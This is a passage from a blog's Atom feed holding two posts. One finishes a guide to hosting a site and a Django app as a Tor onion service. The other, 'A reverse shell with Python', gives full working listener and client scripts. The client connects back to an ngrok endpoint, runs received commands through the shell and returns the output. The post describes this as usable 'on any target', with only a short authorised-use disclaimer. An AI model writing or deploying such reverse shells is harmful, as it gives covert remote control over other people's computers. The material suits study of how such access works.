+    &lt;span class="kn"&gt;try_files&lt;/span&gt; &lt;span class="nv"&gt;$uri&lt;/span&gt; &lt;span class="nv"&gt;$uri/&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;404&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+  &lt;span class="p"&gt;}&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Create the www folder for the html files&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;mkdir&lt;/span&gt; &lt;span class="s"&gt;/var/www/axju&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;I copied my files into this folder. Now enable the site and restart Nginx&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo ln -s /etc/nginx/sites-available/axju /etc/nginx/sites-enabled/
+sudo systemctl restart nginx
+&lt;/pre&gt;&lt;/div&gt;
+&lt;/div&gt;
+&lt;div class="section" id="config-tor"&gt;
+&lt;h2&gt;Config Tor&lt;/h2&gt;
+&lt;p&gt;Create folder for the Tor service&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo mkdir /var/lib/tor/axju/
+sudo chmod &lt;span class="m"&gt;700&lt;/span&gt; /var/lib/tor/axju
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;This folder will later contain some important files for your service, like the
+hostname or the private key. Now open the configuration&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo nano /etc/tor/torrc
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;and add this two lines&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;HiddenServiceDir /var/lib/tor/axju
+HiddenServicePort &lt;span class="m"&gt;80&lt;/span&gt; &lt;span class="m"&gt;127&lt;/span&gt;.0.0.1:80
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Your service should be available after a restart&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo systemctl restart tor
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Get the hostname with&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo cat /var/lib/tor/axju/hostname
+&lt;/pre&gt;&lt;/div&gt;
+&lt;/div&gt;
+&lt;div class="section" id="extra-bind-a-wsgi-app"&gt;
+&lt;h2&gt;Extra - bind a WSGI app&lt;/h2&gt;
+&lt;p&gt;It was so simple that I need something challenging. I'm going to show you how to
+set up a Django project behind a hidden service. You should already know Django.&lt;/p&gt;
+&lt;div class="section" id="setup-django"&gt;
+&lt;h3&gt;1. Setup Django&lt;/h3&gt;
+&lt;p&gt;Install requirements&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo apt install python3-pip python3-venv
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Create a new folder&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;mkdir myproject
+&lt;span class="nb"&gt;cd&lt;/span&gt; myproject
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Set up a new Django project with a virtual environment&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;python3 -m venv venv
+&lt;span class="nb"&gt;source&lt;/span&gt; venv/bin/activate
+pip install django gunicorn
+django-admin startproject myproject .
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Change the project settings just a bit&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;nano myproject/settings.py
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Change only the line with the allowed hosts&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nv"&gt;ALLOWED_HOSTS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;*&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;/div&gt;
+&lt;div class="section" id="change-the-tor-config"&gt;
+&lt;h3&gt;2. Change the Tor config&lt;/h3&gt;
+&lt;p&gt;Open the file&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo nano /etc/tor/torrc
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;and change the hidden service port from&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;...
+HiddenServicePort &lt;span class="m"&gt;80&lt;/span&gt; &lt;span class="m"&gt;127&lt;/span&gt;.0.0.1:80
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;to&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;...
+HiddenServicePort &lt;span class="m"&gt;80&lt;/span&gt; &lt;span class="m"&gt;127&lt;/span&gt;.0.0.1:8000
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Restart Tor&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo systemctl restart tor
+&lt;/pre&gt;&lt;/div&gt;
+&lt;/div&gt;
+&lt;div class="section" id="run-gunicorn"&gt;
+&lt;h3&gt;Run gunicorn&lt;/h3&gt;
+&lt;p&gt;Run gunicorn to bind the WSGI app&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gunicorn --bind &lt;span class="m"&gt;127&lt;/span&gt;.0.0.1:8000 myproject.wsgi
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Of course this is just an example. If you are setup a real service, you will use
+a systemd service or something similar.&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div class="section" id="final-notes"&gt;
+&lt;h2&gt;Final notes&lt;/h2&gt;
+&lt;p&gt;Yes that wars easy and yes you have to do more to hide your service.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;ul class="simple"&gt;
+&lt;li&gt;&lt;a class="reference external" href="https://riseup.net/en/security/network-security/tor/onionservices-best-practices"&gt;Onion services best practices&lt;/a&gt; by Riseup Collective&lt;/li&gt;
+&lt;li&gt;&lt;a class="reference external" href="https://community.torproject.org/onion-services/advanced/opsec/"&gt;Operational Security&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;I also setup Jenkins to automate the publishing. The darknet copy of this blog
+will always be a little bit newer than the main build. Uses the tor browser to
+be the first one to read my post.&lt;/p&gt;
+&lt;/div&gt;
+</content><category term="security"></category><category term="security"></category><category term="linux"></category><category term="darknet"></category><category term="tor"></category></entry><entry><title>A reverse shell with Python</title><link href="https://axju.github.io/posts/2021/02/a-reverse-shell-with-python/" rel="alternate"></link><published>2021-02-19T19:00:00+01:00</published><updated>2021-02-19T19:00:00+01:00</updated><author><name>Axel Juraske</name></author><id>tag:axju.github.io,2021-02-19:/posts/2021/02/a-reverse-shell-with-python/</id><summary type="html">&lt;p class="first last"&gt;I'll show you how to create a reverse shell using Python and how to make the server public using ngrok&lt;/p&gt;
+</summary><content type="html">&lt;p&gt;&lt;strong&gt;Disclaimer&lt;/strong&gt;: The described methods should only be used for systems which you
+have access rights. I used this method to get access to my mums PC, which I was
+allowed. And yes, I'm 31, have my own family, but still help my mom with her PC.&lt;/p&gt;
+&lt;img alt="alternate text" src="https://axju.github.io/images/articels/security/reverse-shell-003.gif" style="width: 100%;" /&gt;
+&lt;div class="section" id="some-basics"&gt;
+&lt;h2&gt;Some basics&lt;/h2&gt;
+&lt;p&gt;What is a reverse shell? With a reverse shell, the target makes the connection.
+On your client is run a server program, which listening for incoming
+connections. And the target execute a program, which connect to your client.
+Then you can run commands on the target from your client. My research:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;ul class="simple"&gt;
+&lt;li&gt;&lt;a class="reference external" href="https://www.acunetix.com/blog/web-security-zone/what-is-reverse-shell/"&gt;Acunetix&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class="reference external" href="https://www.thepythoncode.com/article/create-reverse-shell-python"&gt;PythonCode&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class="reference external" href="https://www.netsparker.com/blog/web-security/understanding-reverse-shells/"&gt;netsparker&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/blockquote&gt;
+&lt;/div&gt;
+&lt;div class="section" id="python"&gt;
+&lt;h2&gt;Python&lt;/h2&gt;
+&lt;p&gt;We will write two small Python scripts one for the server and one for the
+client. The only modules we use are
+&lt;a class="reference external" href="https://docs.python.org/3/library/socket.html"&gt;sockets&lt;/a&gt; and the
+&lt;a class="reference external" href="https://docs.python.org/3/library/subprocess.html"&gt;subprocess&lt;/a&gt;. Make sure you
+have read the documentation. The programs are short and self-explanatory,
+nothing complicated just a little loop.&lt;/p&gt;
+&lt;div class="section" id="server"&gt;
+&lt;h3&gt;Server&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;socket&lt;/span&gt;
+
+&lt;span class="n"&gt;HOST&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;0.0.0.0&amp;#39;&lt;/span&gt;
+&lt;span class="n"&gt;PORT&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;5555&lt;/span&gt;
+
+&lt;span class="c1"&gt;# set up the socket so that it waits for an incoming connection&lt;/span&gt;
+&lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;setsockopt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SOL_SOCKET&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SO_REUSEADDR&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;bind&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;HOST&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;PORT&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;listen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="sa"&gt;f&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;[*] listening as &lt;/span&gt;&lt;span class="si"&gt;{&lt;/span&gt;&lt;span class="n"&gt;HOST&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s1"&gt;:&lt;/span&gt;&lt;span class="si"&gt;{&lt;/span&gt;&lt;span class="n"&gt;PORT&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+&lt;span class="c1"&gt;# waiting for the target and sent a welcome message if it connected&lt;/span&gt;
+&lt;span class="n"&gt;client_s&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;client_addr&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;accept&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+&lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="sa"&gt;f&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;[*] client connected &lt;/span&gt;&lt;span class="si"&gt;{&lt;/span&gt;&lt;span class="n"&gt;client_addr&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;client_s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;welcome&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;encode&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt;
+
+&lt;span class="c1"&gt;# this loop will run, until you enter &amp;#39;quit&amp;#39;&lt;/span&gt;
+&lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="kc"&gt;True&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+
+    &lt;span class="c1"&gt;# 1. enter the command and send it to the target&lt;/span&gt;
+    &lt;span class="n"&gt;cmd&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;input&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;gt;&amp;gt;&amp;gt; &amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="n"&gt;client_s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cmd&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;encode&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt;
+
+    &lt;span class="c1"&gt;# check if you want to quit&lt;/span&gt;
+    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;cmd&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;lower&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;quit&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+        &lt;span class="k"&gt;break&lt;/span&gt;
+
+    &lt;span class="c1"&gt;# get the result of the command, executed on the target pc&lt;/span&gt;
+    &lt;span class="n"&gt;result&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;client_s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recv&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1024&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;decode&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+    &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;result&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+&lt;span class="n"&gt;client_s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;close&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;close&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;/div&gt;
+&lt;div class="section" id="client"&gt;
+&lt;h3&gt;Client&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;socket&lt;/span&gt;
+&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;subprocess&lt;/span&gt;
+
+&lt;span class="n"&gt;HOST&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;0.0.0.0&amp;#39;&lt;/span&gt;
+&lt;span class="n"&gt;PORT&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;5555&lt;/span&gt;
+
+&lt;span class="c1"&gt;# set up the socket and connect to the server&lt;/span&gt;
+&lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;connect&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;HOST&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;PORT&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+
+&lt;span class="c1"&gt;# get the welcome message&lt;/span&gt;
+&lt;span class="n"&gt;msg&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recv&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1024&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;decode&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+&lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;[*] server:&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+&lt;span class="c1"&gt;# this loop will run until it receive &amp;#39;quit&amp;#39;&lt;/span&gt;
+&lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="kc"&gt;True&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+
+    &lt;span class="c1"&gt;# receive the command and print it&lt;/span&gt;
+    &lt;span class="n"&gt;cmd&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recv&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1024&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;decode&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+    &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="sa"&gt;f&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;[*] receive &lt;/span&gt;&lt;span class="si"&gt;{&lt;/span&gt;&lt;span class="n"&gt;cmd&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+    &lt;span class="c1"&gt;# check if you want to quit&lt;/span&gt;
+    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;cmd&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;lower&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;quit&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+        &lt;span class="k"&gt;break&lt;/span&gt;
+
+    &lt;span class="c1"&gt;# now run the command and get the result.&lt;/span&gt;
+    &lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+        &lt;span class="n"&gt;result&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;subprocess&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;check_output&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cmd&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;stderr&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;subprocess&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;STDOUT&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;shell&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="kc"&gt;True&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="k"&gt;except&lt;/span&gt; &lt;span class="ne"&gt;Exception&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+        &lt;span class="n"&gt;result&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;encode&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+
+    &lt;span class="c1"&gt;# if the command has no output, send &amp;#39;ok&amp;#39; so the server knows everything is okay&lt;/span&gt;
+    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;result&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+        &lt;span class="n"&gt;result&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;OK&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;encode&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+
+    &lt;span class="c1"&gt;# send teh result to the server&lt;/span&gt;
+    &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;result&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;close&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div class="section" id="how-to-run"&gt;
+&lt;h2&gt;How to run&lt;/h2&gt;
+&lt;p&gt;We only uses the Python Standard Library, so we don't have to install anything.
+Simple execute&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;python3 server.py
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;and&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;python3 client.py
+&lt;/pre&gt;&lt;/div&gt;
+&lt;img alt="alternate text" src="https://axju.github.io/images/articels/security/reverse-shell-001.gif" style="width: 100%;" /&gt;
+&lt;p&gt;The server run with &lt;em&gt;HOST=0.0.0.0&lt;/em&gt; so that it listen on all incoming connection.
+On some examples you read something like &lt;em&gt;HOST=localhost&lt;/em&gt; or &lt;em&gt;HOST=127.0.0.1&lt;/em&gt;.
+But then it's only listen on connection from the &lt;em&gt;localhost&lt;/em&gt;. You shouldn't
+change the &lt;em&gt;HOST&lt;/em&gt; of the server script. But if you run the client on another PC,
+you have to enter the IP address of the server for the &lt;em&gt;HOST&lt;/em&gt;. You get a problem
+if the PC is not in your local network. Of course you can forward the port in
+your router and then specify your public IP as &lt;em&gt;HOST&lt;/em&gt;. But I want to show you
+another way.&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class="section" id="ngrok"&gt;
+&lt;h2&gt;ngrok&lt;/h2&gt;
+&lt;p&gt;ngrok is a reverse proxy that creates a secure tunnel from a public endpoint to
+a locally running web service. Simply put, with ngrok you can make any local
+service public. And we will make our server public. Go to
+&lt;a class="reference external" href="https://ngrok.com"&gt;ngrok&lt;/a&gt; sign up and follow the setup tutorial for your
+system. For me it's&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;ol class="arabic"&gt;
+&lt;li&gt;&lt;p class="first"&gt;download&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip
+&lt;/pre&gt;&lt;/div&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p class="first"&gt;unzip&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;unzip ngrok-stable-linux-amd64.zip
+&lt;/pre&gt;&lt;/div&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p class="first"&gt;connect your account&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;./ngrok authtoken 1WeW...
+&lt;/pre&gt;&lt;/div&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p class="first"&gt;exposed the server&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;./ngrok tcp &lt;span class="m"&gt;5555&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Now you are ready to run the client on any target, but you have to change the
+&lt;em&gt;HOST&lt;/em&gt; and &lt;em&gt;PORT&lt;/em&gt; to the values from ngrok. For my example that will be&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;...&lt;/span&gt;
+&lt;span class="n"&gt;HOST&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;4.tcp.ngrok.io&amp;#39;&lt;/span&gt;
+&lt;span class="n"&gt;PORT&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;12050&lt;/span&gt;
+&lt;span class="o"&gt;....&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;img alt="alternate text" src="https://axju.github.io/images/articels/security/reverse-shell-002.png" style="width: 100%;" /&gt;
+&lt;/div&gt;
+&lt;div class="section" id="conclusion"&gt;
+&lt;h2&gt;Conclusion&lt;/h2&gt;
+&lt;p&gt;As you can see, it's not that complicated to create your own reverse shell and
+make it public. I know, there's a lot of space to improve this script. But for a
+really Simple example they are quite good enough.&lt;/p&gt;
+&lt;/div&gt;
+</content><category term="security"></category><category term="security"></category><category term="linux"></category><category term="hacking"></category><category term="shell"></category><category term="sockets"></category></entry></feed>
